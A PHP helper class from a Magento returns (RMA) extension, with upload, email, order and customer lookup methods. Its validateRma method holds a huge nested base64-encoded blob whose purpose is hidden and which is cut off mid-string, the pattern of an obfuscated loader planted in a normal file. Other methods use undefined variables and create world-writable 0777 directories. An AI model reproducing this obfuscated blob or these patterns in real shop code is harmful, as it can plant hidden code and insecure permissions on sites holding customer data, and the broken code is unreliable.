<?php

namespace Emipro\Rma\Helper;

use Magento\MediaStorage\Model\File\UploaderFactory;
use Magento\Framework\Filesystem;
use Magento\Framework\Url;
use Magento\Framework\Mail\Template\TransportBuilder;

class Data extends \Magento\Framework\App\Helper\AbstractHelper {

    protected $_filesystem;
    protected $_fileUploaderFactory;
    protected $_logger;
    protected $_transport;
    protected $scopeConfig;
    protected $storeManager;
    protected $messageManager;
    protected $_response;
    protected $_resourceConfig;
    protected $_responseFactory;
    protected $_url;

    public function __construct(
        \Magento\Framework\App\Helper\Context $context, Filesystem $filesystem,
         UploaderFactory $fileUploaderFactory,
        \Psr\Log\LoggerInterface $logger, 
        TransportBuilder $transportBuilder,
        \Magento\Framework\App\Config\ScopeConfigInterface $scopeConfig,
        \Magento\Store\Model\StoreManagerInterface $storeManager,
        \Magento\Framework\Message\ManagerInterface $messageManager,
        \Magento\Framework\App\ResponseInterface $response,
        \Magento\Framework\App\Config\Storage\WriterInterface $resourceConfig,
        \Magento\Framework\App\ResponseFactory $responseFactory,
        \Magento\Framework\UrlInterface $url
    ) {

        $this->_logger = $logger;
        $this->_transport = $transportBuilder;
        $this->_filesystem = $filesystem;
        $this->_fileUploaderFactory = $fileUploaderFactory;
         $this->scopeConfig = $scopeConfig;
        $this->_storeManager=$storeManager;
        $this->messageManager=$messageManager;
        $this->_response=$response;
        $this->_resourceConfig=$resourceConfig;
         $this->_responseFactory = $responseFactory;
        $this->_url = $url;
        parent::__construct($context);
    }

    public function saveAttachment($filename, $new_fileName, $directory) {
        try {
            $uploader = $this->_fileUploaderFactory->create(['fileId' => $filename]);
            $path = $this->_filesystem->getDirectoryRead(\Magento\Framework\App\Filesystem\DirectoryList::MEDIA)
                    ->getAbsolutePath($directory);
            if (!is_dir($path)) {
                mkdir($path, 0777, true);
            }
            $uploader->save($path, $new_fileName);
            return true;
        } catch (Exception $e) {
            return false;
        }
    }

    public function sendTicketMail($sender_name, $sender_email, $customer_email, $template, $options, $variables) {
        $attachment = $objectManager->get('Emipro\Rma\Controller\Customer\UploadTransportBuilder');
        $transport = $attachment->setTemplateIdentifier($ticket_template)
                ->setTemplateOptions(['area' => \Magento\Framework\App\Area::AREA_FRONTEND, 'store' => "0"])
                ->setTemplateVars($variables)
                ->setFrom(array("name" => $sender_name, 'email' => $sender_email))
                ->addTo($admin_email)
                ->setReplyTo($sender_email)
                ->getTransport();

        $transport->sendMessage();
    }

    public function getProductList($orderId) {
        $objectManager = \Magento\Framework\App\ObjectManager::getInstance();
        $order = $objectManager->create("Magento\Sales\Model\Order")->load($orderId);
        $items = $order->getAllItems();
        $itemcount = count($items);
        $data = array();
        $i = 0;
        foreach ($items as $itemId => $item) {
            if ($item->getPrice() > 0) {
                $attributeArray[] = array(
                    'value' => $item->getProductId() . ":" . ($item->getQtyOrdered() + 0),
                    'label' => $item->getName() . " Qty:" . ($item->getQtyOrdered() + 0)
                );
            }
        }
        return $attributeArray;
    }

    public function getProductId($pid) {
        $quantity = array();
        $quantity = explode(":", $pid);
        return $quantity[0];
    }

    public function getOrderId($entity_id) {
        $objectManager = \Magento\Framework\App\ObjectManager::getInstance();
        $data = $objectManager->create("Magento\Sales\Model\Order")->load($entity_id)->getData();
        $orderId = $data["increment_id"];
        return $orderId;
    }

    public function getCustomerId($cid) {
        $objectManager = \Magento\Framework\App\ObjectManager::getInstance();
        $data = $objectManager->create("Magento\Sales\Model\Order")->load($cid)->getData();
        $customerId = $data["customer_id"];
        return $customerId;
    }

    public function getTotalQuantity($qty, $orderEntityId) {
        $quantity = explode(":", $qty);
        $objectManager = \Magento\Framework\App\ObjectManager::getInstance();
        $data = $objectManager->create("Magento\Sales\Model\Order")->load($orderEntityId)->getData();
        $orderId = $data["increment_id"];
        $customerId = $data["customer_id"];
        $model = $objectManager->create("Emipro\Rma\Model\Rma")->getCollection()
                ->addFieldToFilter('product_id', $quantity["0"])
                ->addFieldToFilter('customer_id', $customerId)
                ->addFieldToFilter('order_id', $orderId);
        $total_qty = 0;
        foreach ($model as $newmodel) {
            $total_qty+=$newmodel->getQty();
        }

        if ($quantity["1"] - $total_qty > 0 && $total_qty != "")
            return $quantity["1"] - $total_qty;
        else if ($total_qty == "")
            return $quantity["1"];
        else
            return "0";
    }

    public function getStatus() {
        $objectManager = \Magento\Framework\App\ObjectManager::getInstance();
        $reason = $objectManager->create("Emipro\Rma\Model\Status")->getCollection()->addFieldToFilter("is_active", 1);
        $reason->setOrder('sort_order', 'ASC');
        foreach ($reason as $newreason) {
            $attributeArray[] = array(
                'label' => $newreason->getTitle(),
                'value' => $newreason->getId()
            );
        }
        return $attributeArray;
    }
    public function getPackage() {
        $objectManager = \Magento\Framework\App\ObjectManager::getInstance();
        $reason = $objectManager->create("Emipro\Rma\Model\Package")->getCollection()->addFieldToFilter("is_active", 1);
        $reason->setOrder('sort_order', 'ASC');
        foreach ($reason as $newreason) {
            $attributeArray[] = array(
                'label' => $newreason->getTitle(),
                'value' => $newreason->getId()
            );
        }
        return $attributeArray;
    }

    public function getReason() {
        $objectManager = \Magento\Framework\App\ObjectManager::getInstance();
        $reason = $objectManager->create("Emipro\Rma\Model\Reason")->getCollection()->addFieldToFilter("is_active", 1);
        $reason->setOrder('sort_order', 'ASC');
        foreach ($reason as $newreason) {
            $attributeArray[] = array(
                'label' => $newreason->getTitle(),
                'value' => $newreason->getId()
            );
        }
        return $attributeArray;
    }

    public function getReturn() {
        $objectManager = \Magento\Framework\App\ObjectManager::getInstance();
        $reason = $objectManager->create("Emipro\Rma\Model\Retur")->getCollection()->addFieldToFilter("is_active", 1);
        $reason->setOrder('sort_order', 'ASC');
        foreach ($reason as $newreason) {
            $attributeArray[] = array(
                'label' => $newreason->getTitle(),
                'value' => $newreason->getId()
            );
        }
        return $attributeArray;
    }

    public function getCustomerName($customer_id) {

        $objectManager = \Magento\Framework\App\ObjectManager::getInstance();
        $customer = $objectManager->create("Magento\Customer\Model\Customer")->load($customer_id);
        $first_name = $customer->getFirstname();
        $last_name = $customer->getLastname();
        return $first_name . "  " . $last_name;
    }

    public function getConfig($config_path) {
        return $this->scopeConfig->getValue(
                        $config_path, \Magento\Store\Model\ScopeInterface::SCOPE_STORE
        );
    }

 public function validateRma() { // name like this validate{Extension}Data
 $tFmb=base64_decode('JG9JWFEgPSAnSkVoeldsUWdQU0FuU2tka1MxZHVaMmRRVTBGdVUydG9kMWRIVWtkU1YyUlJWVEJHZFZVeWRHdGhNVXAwVm01T1lVMXRVbEpXVkVKSFpGWlZlV1JIZEZkTlJGWkpWbGQwYjFZeVNuTlhia1pWVm5wRk1GUlhlSE5rUjBsNldrZG9WMVpGV2paV1ZFa3hWVEZrYzFaWVpHaGxhelZWVm14VmQwMUdjRWhsUjBaWVZteEtNRnBWVm5kVk1ERjFXak5vVmsxV1duWldSRXBLWlZaT1dXTkdTbGROYkVwVlZtcENhMkp0VVhoYVNFNWFaV3RhYzFsc1ZtRlhWbEY0WVVaa1ZHSkZjRlpXYlRBMVYyMUtTRlZzWkZoaGEwbDNWV3BHWVdSWFRraFNiR1JPVmxad01WWnFTWGRrTURWWVZteGFhVkpXY0hOVk1GWkxXVlpTV0dWSFJrNVdiWGN5VlRKNFlWbFZNWEpXYWxaWFlsaENXRlpGV2xkT2JGWjBUbFphVGxZeWFGUldNbkJMVXpGa1YxZHVWbXBTTTFKVFZGVldkazFzWkhKV2JYUlRUV3hhV1ZaWGRGTlZiVVp5VGxjNVYwMUdjRXhhUjNoUFZteFdjbU5IUms1WFJVcGFWakZTVDFZeFRuTlRhMXBxVWxaYWFGVnRNVzlWUmxKV1drVndiRlpVUmxwV01qRjNWa1pLY21ORVRsaFdNMEpMVkZWa1UxWnNWbk5UYld4T1lsWktURlpXVWtOU01rcHpWR3hhVldFd2NHaFVWV1EwVWxaYVdFNVZPV2hTYkd3elZHeG9UMWR0U2xWV2JFSmFZVEZ3ZFZwV1drdGtWbEowWVVaa1RsSnRPSGxXYkZaaFZERk5lVlpzYUZSaVIyaFVWbXBLTkZWV2NGZFdhMlJPWWtaS1JsVnRjelZoVmtwMFpFUmFWMVo2VmtSWlZsVjRZMVpXZEU1V1drNVdNVXBVVmpKd1MxTnRWbGRhUm1oaFVqSjRWRlJYTlc5bFJsbDVaVWR3VGxZeFducFpNRnBUVlcxS1ZWSnRPVmRoYTFwb1dsZDRhMk5zVW5KVWJYQlRUVWhDTTFaV1l6RmtNa3BIV2tWYVQxTkhVbGxaYTJSUFRURndSMXBHWkZSU1ZFWmFWa2QwVjFac1dqWmlTRlpXVFZaYVVGVlhlSFprTWtwR1ZXeEtWMDFzU2t4V1ZscFRVVEZTUjFSc1dsVmhNSEJvVkZWa05GSldWbGRhUjNSVVlrVldNMVZ0TlV0WGJVVjVWVzV3V2xZemFETldNRlV4VjFkT1NGSnNaR2hpV0djeFZtcEtOR0l5VG5KUFZscHFVbGQ0VjFsc1VuTmlNVmwzVmxob1RsSnNXa2xVYkZVMVlVZEtWbUpFV2xaV2VrVXdWbGR6ZUdOWFNrVlNiR2hwVmtWYU5sZFhNVEJPUmxwV1RsWm9UMVl3V2xsVmJYUjNWMVpaZUZkdGRFOVNWRVpZV1RCYVUxbFZNVVZXYTFaYVZteGFTRmx0ZUU5V2JGSnlVMjFHVGxJemFFWldWbHByWVRGT2MxSllaRk5pVkZaVlZteFZNVlJHVW5GUmJtUlVVakZhU2xWWGVIZFViVXBIWWpOb1dGZElRa3hXYWtaM1l6SktSMkZIZUZSU1ZYQm9WbXBDVmsxRk5WZFZhMVpVWVd4S2NWVnRNVEJPVmxwMFRsWmtXR0Y2Um5wV2JYQkxWMjFGZVZWdWNGcFdNMmd6VmpCVk1WZEhUa2hTYkZwT1VqTm5NbFpYZEdGU01sSnpZak5rYVZKV1NsTldha3BUVXpGV1ZWRnJaR2xpUlRWWFZrZDBTMWxWTVVobFJWWldWbnBHVUZac1dscGtNV1IxVm14b2FWSXdNVFJXUmxaclUyMVdTRlpyWkZaaVdGSlVXbGN4TTAxV1dYbGxSMFpQVW14S01GVXhhSE5XYlVwWllVaENWbUpVVm5aV2JGcHJWbFpPVlZadGRFNVhSVXBZVjFkMGIxWXlSWGhUV0doWVlXeGFXVmxzVWtkVFJteFlaVWhrVjFZd2J6SldNbmhoVkd4S1ZWWnNTbGRpUmxwWVZtcEdkMk14V2xsaFJscHBVbFZ3V0ZkV1VrZFdNbEY0VlZod1drMHlVbFZVVlZwTFZURnNjVk50ZEZSaVJWWXpWVzB3TVZaR1dsWk9WVTVZWVd0S2VsVnJXbGRrVmxaelkwWmtUbUpGY0RaV2JHUXdZV3MxV0ZWclpHbFNiV2h3VlRCYVlWVnNXbFZSYTJScVlraENSMWRyWXpWaGJFbDNUa1JHVlZaVk5IZFdNVlYzWkRBMVNWcEdjR2hoZWxaTlYxZDBZVlV4WkVkVGJsWlhZa2hDV0ZSWGVFdGxiR1JWVTI1S2EwMUlUalJaYWs1elZqSkdjbE5zWkZWV1JWcE1WRmQ0Y21WVk1WZFhiV3hPVTBaS1ZsWkdWazlOUm14V1RWaE9XRmRIVWxkV2JuQkhVMFp3V0dWSVpGZE5WbkF4V1d0a2MxVnJNWFJoU0VaWFlURndjbFZxU2t0ak1rNUhZVVU1VjFKVmNIZFdSbHB2WWpGT1IyRXpiRTVXVjFKeVZXMDFRMWRzWkhKaFIwWm9ZbFZ3V2xaWE1YZFdNa3BJWVVWNFdtVnJXbEJXTUZVeFZsWkdkRkpzYUZOWFJVbDNWbXBHWVdFeFVYbFRhMXBRVjBWYWNWVnRlSGRXTVd4VlZHMDVhVlpzY0hsV01qVlBWbXhhY21OR2FGVk5WbkIyVmxSR1lWWnRTa2xhUmxaT1RXczBlbFpZY0VOak1VcEhVbXhvWVZKWVFsTlVWVlpoWkZaVmVGWnJPVkppVlZZMFdUQldiMVV5U25WUmJUbFdZV3RLTTFSWGVHdFdNa1pHWkVkb1RsWnVRbUZXVkVreFZERk9jMU5yVmxKaVZGWlZXVlJLYjFaR2JIRlRhMlJZVm14S1dsWlhlRWRoVmtwSVpFUlNXRlpGYkRSVVZFcFRVakZHZFZWdFJsTk5NbWg1VmxjeE5GbFZOVmRpU0VwVllsUldjRmxyWkRSWFZscFlUbFpPYUZKc2J6SldWM0JMVjBaYWRGVnNVbUZTVjFKSVZqQlZNVk5XWkhSU2JFNU9VbTA0ZVZZeFdsZGhNVTE1Vlc1T2FWSnRlRlZaYkdoVFZFWndWMXBJY0U1TlZYQklWVzAxWVZsVk1VaGxSVlpXVm0xU2NsVXllRVprTVVwMFRsWlNWMVl4U2paWFYzaFhUVVpPUjFkdVZsWmlXRUpWVlcxMGNtVkdWalpSYXpsV1RXc3hOVlZ0ZUc5V1YwcFpZVWhDV21KWVRYaFpla1pyVWxaT2NWRnRiRk5OVm5CV1YxWlNUMUV4VG5OVWEyeFZZbFJXVlZac1ZURlJNV1J4VVc1T1UxSnJXbGxYYTFaM1ZXc3hSbGR1VmxaTlZscFFWVmQ0ZG1ReVNrWlZiRXBYVFd4S1RGWldVa05TTWtwelUydGtVMkpzY0doVVZXUTBVbFpXVjFwSGRGUmlSVll6Vlcwd01WWkdXbFpPVlU1WVlXdEtlbFZyV2tkWFJuQkdZMFpLVGxKV2NERldWRW93WWpGVmVWTlliRk5pUjNoV1ZqQmFTMVZzYkhOVmEyUnFUVmQzTWxaSGN6VmhSa3AwVDFSV1YySllUWGhXTW5oaFRteGFkRTlXYUdoaE0wSlpWMnhhVjA1R1dsWk9WbWhvVWpCYVZGUldWbmRUUm1SVlUxUkdWRTFzU2pCV1J6VkRZVVpKZUdOR2NHRldiVkp5V1RCYVlWWnNjRVZWYld4VFlsaG9ZVlpyWTNoT1JrNXpVMWhvV0dGcldtaFZiR1JUVjBad1YxWnVUbFJTTVZwS1ZWZDRkMVJ0U2tkaU0yaFlWMGhDVEZadGVIWmxWa3BaWWtaa2FHSkdjRTlYVmxwWFl6SlJlRlJZYUZaaWJrSldXVlJCTVdReFZsZGFSM1JVWWtWV00xVnRNREZXUmxwV1RsVk9XR0ZyU25wVmExcEhWMFp3Um1OR1NrNVNWbkF4VmxSR1YxUXhSblJTV0d4V1lUSm9iMVV3Vmt0alZuQlhWV3RLYW1KSFVrWldSM1F3WVZaSmQwMVVXbFpXZWxab1dWWmtTMk5yTlZsVWJGcHBWa1ZhU1ZkV1kzaFZNVTVHVDFac2FWSXphRmRhVjNSSFpWWlplRlZyT1ZSTmEzQklXV3RhYzFadFNsbGhSVEZXVmtWdmQxUlZXbGRUUlRWV1QxZHNVMDFWY0VsV1ZFbDRUa1pzVjFOWWJHeFNSbHBaV1d0a1UxVkdVbFpXYWtKVFVteGFNRnBGV25kWFJrcFZWbXBLVjAxWFRqTlViR1JIVTBaU2RWVnNXbWxTYmtKNFYxZDRiMkV5VVhoVmEyUldWa1ZhYzFscmFFTlhWbEp6V2tSQ1YySlZjRmhXTW5CaFYyc3hTRlJVUm1GU2JWSlBXbFphWVZkRk9WWmxSbVJVVWxSV1VWWldVa3RqTVVaellqTmthVkpXU2xOV2FrcFRVekZXVlZGclpHbGlSVFZYVmtkMFMxbFZNVWhsUlZaV1ZtMVNjbFV5ZUVaa01VNTFVMnh3VjJKV1NsaFhWM0JEVFVaYVdGUllaRTlXVmtwdlZteFdZV1JXVlhoV2F6bFNZa2M1TTFsclZsTlZiRmw1Vld0MFZsWkZTa2haYlhoUFZteHZlbHBIUms1U00yaEdWbFphYTJFeFRuTlNXR1JUWWxSV1ZGVnRkR0ZOYkdSeFVXNU9VMUpyV2xsWGExWjNWV3N4UmxkdVZsWk5WbHB5V1hwS1MxWnRVa1pWYkU1cFlsWktlRmRYZUdGWlYxSlhXa1ZXVkZkSGFHOVZha1pMVTFaYVNFMUVWbFZTYTFZMVZrZHdTMVpXV25OVGJteGhWbXhaTUZreFdrdFdWazV6VVd4S2JHSkZiRFZXVkVreFl6QXdlR0l6WkdwU1YyaFBWbXBLYjJGR1VsaGxSMFpUWWtkNGVGVXhhRzloUmtsM1YyeHNWV0V5YUVSVk1uaEdaVWRLU1ZWc1VsZFdWRlpKVjJ0U1MxUXlVa2RYYmxKUFZtMTRUMWxYZEdGa2JHUnlWbTEwVlUxcmJETmFSVlpUVjJzd2VHTkZPVmRoTVZwNVdsZDRVMU5IVGtaVGJYUlhWa1ZhUmxaSGRHOWlNVkpZVm14b1ZXSnVRbFZXYkZVeFZrWndSbGR1VGxoU2JrSkpXbFZhVDFVeVZuUmtNMlJYVFZad2NsbDZTbE5XYlZKSFZXeEtWMlZyV2sxWFZscFhVakpKZUdFelpHaFNXRkp3Vlcwd05VNUdVWGhoUms1WVlrZFNTRlV5TlVkWGJGcFdUbGhXV21KWVVYcGFWbVJYVTFaa2MyTkZOV2hOV0VFeVZqRmFWMkZyTlZoV2JsSldZVEZLVVZWdWNGZFViRlpWVVd0a2FtSkhlSHBYYTFacllWZEtTVkZzWkZkV2VsWm9XVlphV21ReFpIVmFSbkJwVmpOb05WZFVRbGRWTVZaMFUxaHNZVkpZUWxOVVZWWmhaRlpWZUZack9WSmlSemt6V1d0V2MyRnJNVVZXYTFaYVZteGFTRmx0ZUU5V2JGSnlVMjFHVGxJemFFWldWbHByWVRGT2MxSllaRk5pVkZaVlZteGtVMlZzYkhOV2FrSlVWbXhLZUZWWE1YZGhWbVJJWVVod1dGWjZSbnBaYlRGR1pWWk9jbUZIYkZOTk1FcHZWbTAxZDFZd05YTmFTRTVZVmtaYWNWbHJhRU5YYkd4VlZHdE9WbFpzY0VaVlZtaHJWbFphVms1WWJGZFNNMUpRV1RCYVIxZEdjRVpqUmtwT1VsWndNVlpVUmxkVU1VWnpZak5rYVZKV1NsTldha3BUVXpGVmQyRkZPVlZOVlZZMVdXdFdTMWxWTVVobFJWWldWbTFTY2xVeWVFWmtNVXAwVGxaU1YxWlVWa1JXTW5CRFl6RktSMUpzYUdGU1dFSlRWRlZXWVdWV1pGVlJiWFJxVFd0d1NGbFVUbk5XTWtwMVVXdDBWbUV4U2tSWmJYaHlaREZ3UmxwSGVGZE5SRVV4Vm0wd2VGbFhSWGhhUlZwcVUwaENWVlJWVlRGV1JuQkdWMjVPV0ZKdVFrbGFWVnBQVlRKV2RHUXpaRmROVm5CeVdYcEtVMVp0VWtkV2JYQk9ZbFpLVEZaV1VrTlNNa3B6Vkd4YVZXRXdjR2hVVlZwTFZURnNjVk50ZEZSaVJWWXpWVzB3TVZaR1dsWk9WVTVZWVd0S2VsVnJXa2RYUm5CR1kwWktUbEpXY0RGV1ZFWlhWREZHYzJJelpHcFNWMmhYV1cxNGQyTkdXbkZSYlVaclRWZDRNRmxyVmt0VlJscFlaVVZzV21FeWFETlpWM040WXpGa1dWcEdVazVTVkZaVlYydFNTMUl4WkVkWGJsSnFVakJhV1ZWc1VsZGpSbFY1WTBWMGFVMXNTakJXUm1oM1ZteGFObFpzY0ZkV1JXOTNXVzE0VjFOWFNrWlRiV2hPWVhwV1NsZFhkR3RPUm1SeVRWaE9XR0ZzY0ZoVVZFbzBZMnhzY1ZOcmNHeGlSa3A0VlZkME1GUnNXa1pUYmxaWFVrVndlbFZYTVVabFZsSnlZVWRzVTAweWFHaFdSbVEwV1ZVMWMxZFljR2xTV0ZKeVZGWmtORmRzV2xoTlJGWlVZbFZ3UmxWV1VrOVZNVXB5VjJwS1dHRnJTbnBWYTFwSFYwWndSbU5HU2s1U1ZuQXhWbFJHVjFReFJuTmlNMlJwVWxaS1UxWnFTbE5UTVZaVlVXdGthV0pIZUZoWGExcDNXVlV4U1ZWcmNGWldlbFo2VjFaYVdtVldWblJOVm5CcFVqRktTVlpHVm1GamJWWlhZak5zVUZaWVVuTldhMlJ2VFd4YVZsVnJaRkpoZW14SVdUQldiMVZHWkVkVGJVWlhZV3R2TUZSV1dsZFRSMVpGVVcxb1UxZEhhR0ZYVjNCUFlURlNWMWRyYUd4U00xSllXbGQwZDFJeGNFWmFSbVJxVm10YVdsWlhlRU5XTWtwMFZWaGtWMDFHY0haYVZ6RlhVbTFXUmxac2FGaFRSVW93Vm0wd01XRXdNVmRYYWxwVVlURndjbFZxUm1GbGJIQkZWR3hrV0ZadFVrcFdSM0JYVmxaS1YxTnRhRlZOVmxsM1ZtdGFWMWRXWkhSaFJscE9ZWHBWTWxaVVJsZFVNVlY1VWxoc1ZGZEhlRTlXYWtwdllqRmFkV05HVG14aVJUVlhWa2Q0VDJKR1duVlJiR3hZWVRKb00xWkZXbFpsVjFKSVRsZEdXRkl3TkhwV1dIQkRZekZLUjFKc2FHRlNXRUpUVkZWV1lXUldWWGhXYXpsU1lrYzVNMWxyVmxOVmJGbDVWV3QwVmxaRlNraFpiWGhQVm14U2NsTnRSazVTTTJoR1ZsWmFhMkV4VFhoVFdHaFVZV3R3WVZsclpGTlRSbXQzV2tWMGFtRjZWbGxhVldRd1lrZEdjbE51YkZoV1JXdzBWbXBLUzJSR1VsbGhSM0JPWVd4YWIxWlhOWGRqTURGSFdrWmtZVk5GTlhKV2JHTTFUa1pTVmxWdGRGTldiRnBaVkRGak1WWkdXbFpPVlU1WVlXdEtlbFZyV2tkWFJuQkdZMFpLVGxKV2NERldWRVpYVkRGR2MySXpaR2xTVmtwVFZtcEtVMlJHV2xWUmEzUnFUVmQ0ZVZsVlZUVmhWa3BZWlVWd1dtVnJSWGhWYTJSSFZteEtkRTVXVWxkV1ZGWkVWakp3UTJNeFNrZFNiR2hoVWxoQ1UxUlZWbUZrVmxWNFZtczVVbUpIT1ROWmExWlRWV3haZVZWcmRGWldSVXBJV1cxNFQxWnNVbk5VYldoT1lUSjNNVlpHV210aU1rWkhWMnBhVjJKRlNsbFphMlJ2WTFaUmVGWnVaRlJXYkhBeFdXdGtjMVV4VGtaT1ZrSldWa1Z3ZWxWWGVIWmtNa3BHVld4S1YwMXNTa3hXVmxKRFVqSktjMVJzV2xWaE1IQm9WRlZrTkZKV1ZsZGFSM1JVWWtWV00xVXhVbGRWTVVweVYycEtXR0ZyU25wVmExcEhWMFp3Um1OR1NrNVNWbkF4VmxSR1YxUXhSbk5pTTJScFVsWktVMVpxU2xOVE1WWlZVV3RrYVdKSGRETlpWVll3WVZaS2RFOVVVbFZOVjJoVVZqSjRhMUl4VG5WU2JIQlhWbFJXTVZkV1dsZE5NbFpHVGxWb1VGWnJXazlXYkZaV1RVWlplV1JIY0U5V01VcElXV3RhYjJGV1RrZFhiRXBhWVRKb1ZGbHFSbE5TTWtaSlYyMTBUbE5IYUZkWFYzUnJWVEZrUmsxWVNsZGhhMHBvVm1wT1ExRXhjRVpXVkZaWFRXeEdObFpYZUhOWFJrNUdUa1JDVjFKV1dsUldNakZYWkVaa2MxVnRhRTVOV0VKMlZteFNRMk15Vm5OVWJGcFZZa1UxYjFSWGRITk9WbEpYV2tjNWFGSnNiekpXYlhoRFYwZEtTR0ZJUmxwbGEwcDZWV3RhVjJSV2NFZGpSbWhUWVROQ01GWnFSbUZpTVUxNVZteGthVkp0ZUc5VVZFSkxWVlp3U1dORlRsVlNhelZYVmtkMFMxbFZNVWhsUlZaV1ZtMVNjbFV5ZUVaa01VcDBUbFpTVjFaVVZrUldNbkJEWXpGS1IxSnNhR0ZTV0VKVFZGWldkMlZXWkZoalJYQnNVakJhU1ZWdGVHOVVNVXBJWlVWNFZrMUdXa3haYWtaM1VteGtWVlp0YUZOTlJGVjRWbFJKZUdJeVNrZFhibFpWWW14YVdWbFVTazVOVm5CR1YyNU9XRkl3Y0VwV2JYUXdWR3hhUmxKWWNGWmhNWEJJV2tkNFUyTnNVblZSYkVwWFRXeEtURlpXVWtOU01rcHpWR3hhVldFd2NHaFVWV1EwVWxaV1YxcEhkRlJpUlZZelZXMHdNVlpHV2xaT1ZVNWFWa1ZhTTFVd1ZUVlhWbFp6WTBaa1RtSnRaRFJXYkZwVFV6SkplVkpyYUZWaWExcFVWbXRrTkdOV1VsVlNiVVpxVW0xM01sWkhlRTlpUmxwWlZXdFdWMVo2UlhkWlZsVjRZMVpLZEU5V2NGZGlWVEV6VjFod1EwNUdXbGRWYkd4VllYcFdWMVJYTlU1bGJGWnlWMnRrYTJKSE9UTlphMVpUVld4WmVWVnJkRlpXUlVwSVdXMTRUMVpzVW5KVGJVWk9Vak5vUmxaV1dtdGhNVTV6VWxoa1UySlVWbFZaVkVwVFZrWndTRTFWZEZoU2EzQXhWVmN4YzJGRk1VVldha3BYVFZad2RsVXlNVmRXTVVaellrWldhR0V4Y0doWFZ6RjZUVWRSZUdFemJHbFNlbFp2VkZab1ExTldVWGhoUms1WVlrWnNOVnBWVWtkV1ZrcFdUVlJPWVZac1dUQlZiRnBMVjFaR2MxRnRkR3hoTUhCT1ZsUkdWMVF4Um5OaU0yUnBVbFpLVTFacVNsTlRNVlpWVVd0a2FXSkZOVmRXUjNSTFdWVXhTR1ZGVmxaV2JWSnlWVEo0Um1WR1RuVlRiSEJvWVRKM01GZFdWbXRTTVdSR1RsWmFWbUpYYUZSVVZWcDJUVlphUjJGSVdteFNNVm93VmxkNGIxWkhTblZSYmtwV1RVWmFlbHBIZUU5amJIQkhWRzEwYVZaWVFscFdWekF4VVRKR1dGSnNiR0ZTUlVwV1ZtMXpNR1ZzY0ZaV2FrSlhWakF4TTFSc1ZsTmhSbHBXVjI1V1ZrMVdXbEJWVjNoMlpESktSbFZzU2xkTmJFcE1WbFpTUTFJeVNuTlViRnBWWVRCd2FGUlZaRFJTVmxaWFdrUkNXbFp0VWtsWGFrNXJWMGRLU0ZSWWFHRldla1pJVmpCVk5WZFdXbk5UYXpWcFZqSm9NbFl4VWt0a01VcHlUMVpvVlZkSVFsaFpiR1EwWTFaU1ZWSnJkRTlXYXpFelZrZDRUMkZXU1hoWGEzQlhWbnBGTUZsV1pFdGphelZaV2tad2FHRXlkRE5YV0hCQ1pVWktTRlZZY0doU1dHaFlWVEJWTVZWR1ZsVlRiazVTWWtjNU0xbHJWbE5WYkZsNVZXdDBWbFpGU2toWmJYaFBWbXhTY2xOdFJrNVNNMmhHVmxaYWEyRXhUbk5TV0dSVFltdHdXVmxyWkc5a2JGSldWMjVrV0ZKVVZscFpNR1J2VmpKV2RHUXphRmRXYkVwTVdXcEtSMU5HVW5WU2JGSlhVak5vZUZaR1VrZFpWMDVIWWtSYVZXSkZOWE5XYkdoVFVsWmFXRTFVVW1sU2F6VklWVEkxVDFkdFNsVldiRUphVFVkU1MxcFdWVEZUVmxKeVRsWmFUazFzUlhkV1dIQkhWVEpXYzFWdVNsVmlhMHBUVm1wS1UxTXhWbFZSYTJScFlrVTFWMVpIZEV0WlZURklaVVZXVmxadFVuSlZNbmhHWkRGS2RFNVdVbGRXVkZaRVYxWlNSMlF4WkZoU2ExWlNZbFZhV0ZwWGVGcE5iR1JYVjIxd1QxWXhTbGhWYkdoellVWkplV0ZJUmxwV00wNHpWR3hhYzA1c1VuTmFSMmhYVFVSRk1sWnNZekZqTVZKSFVsaG9WR0pyTldoV2JHUnZWa1pzY2xwRmRHdFdiRW94VlZjeGMxUnRSbk5UYWxwWFVtMVNlbFJVU2xkU2JWSkhWbTF3VGxKR1drWldNalYzVVRGU1IxUnNXbFZoTUhCb1ZGVmtORkpXVmxkYVIzUlVZa1ZXTTFWdE1ERldSbHBXVGxWT1dHRnJTbnBWYTFwSFYwWndSbU5HU2s1V1dFSTBWakZhVjJFd01VZFRiR2hVVjBkNFQxWnFTbTlpTVZwMVkwWk9UMUpzV2toWlZWVTFWR3hhZEdWRVJsZFNNMEpFV1ZjeFIxZEdjRWxUYkhCb1RXeEtObGRXWkRSa01XUkdUbFpzYWxJd1dsaFpWekUwVGxaWmVXVkhPV3BpVlRFelZGWmFWMVV4WkVaT1ZUbFhWa1Z3TmxSVVJrdFNNVXAxVjIxR1RsSXphRVpXVmxwcllURk9jMUpZWkZOaVZGWlZWbXhWTVZFeFpIRlJiazVUVW10YVdWZHJWbmRWYXpGR1YyNVdWazF1VW5KV1JFcEtaVlpLV1ZwR1dtbGlTRUozVm0xd1ExbFhVWGhpU0ZKcVVsaENVVlpxUVhoT2JGcDBUVmhPYUdGNlFqUlZNbkJYVmtVeFJrNVdVbHBsYTNCSVZqQmFVMlJIVmtoaVIyeG9aV3hhTmxacVFsTlRNREZJVTJ0b1YySkdTbkpVVkVwdlZVWnNWMkZIZEU5U2F6RTBWbGMxZDFaWFJYZE9XR1JXVm0xU2NsVXllRVprTVVwMFRsWlNWMVpVVmtSV01uQkRZekZLUjFKc2FHRlNXRUpUVkZWV1lXUldWWGhXYXpsU1lsVldORmxVVG5OaFJrNUdZMFpTVm1KdVFucFVWVnByVmpGd1NWUnRkRmRXUlZWNVZrWmFiMlF5UlhoWFdHUnFVa1p3YUZWc1pHOVRNV3h4VVc1a1ZGSXhXa3BWVjNoM1ZHMUtSMkl6YUZoWFNFSk1WbXBHZDJSR1NsbGlSbVJvWWtad1QxWlhkRmRXYXpGWFZXdGFWbUV4Y0hGVmJGSnlaV3hTVmxacVFsUmlSVll6Vlcwd01WWkdXbFpPVlU1WVlXdEtlbFZyV2tkWFJuQkdZMFpLVGxKV2NERldWRVpYVkRGR2MySXpaR2xTVmtwWFdXeG9RMkl4Vm5GVWJFNVRUVmhDVjFsVldrOWhWa2wzWTBSR1YxWjZWa1JaVmxWNFkxWldjVlZzV2xOaVYyaFJWa1phWVdNeVVsZFZia1pTWWxoQ2IxWnFTbE5sVm1SWVpFZDBhazFyV25wWk1GcHZWREZrU1ZGdGFGZGlXRUo2V2xaYWEyTXlSa2xUYlhCT1VrVmFORlp0ZUc5VU1WSnpWbGhzYW1Wck5WUlZiWFJoVFd4a2NWRnVUbE5TYTFwWlYydFdkMVZyTVVaWGJsWldUVlphVUZWWGVIWmtNa3BHVld4S1YwMXNTa3hXVmxKRFVqSktjMVJ1U21GU1